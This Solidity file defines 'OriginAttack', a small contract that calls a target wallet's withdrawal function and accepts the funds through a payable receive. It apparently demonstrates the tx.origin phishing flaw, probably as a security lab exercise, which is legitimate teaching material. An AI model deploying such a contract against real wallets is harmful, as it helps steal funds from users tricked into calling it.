// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

 interface IOriginWallet {
    function withdrawal(uint256 amount) external;
}
contract OriginAttack {
    IOriginWallet public wallet;

    constructor(address _wallet){
        wallet = IOriginWallet(_wallet);
    } 

    function attack(uint256 amount) external{
        wallet.withdrawal(amount);   
    }

    receive() external payable {}
}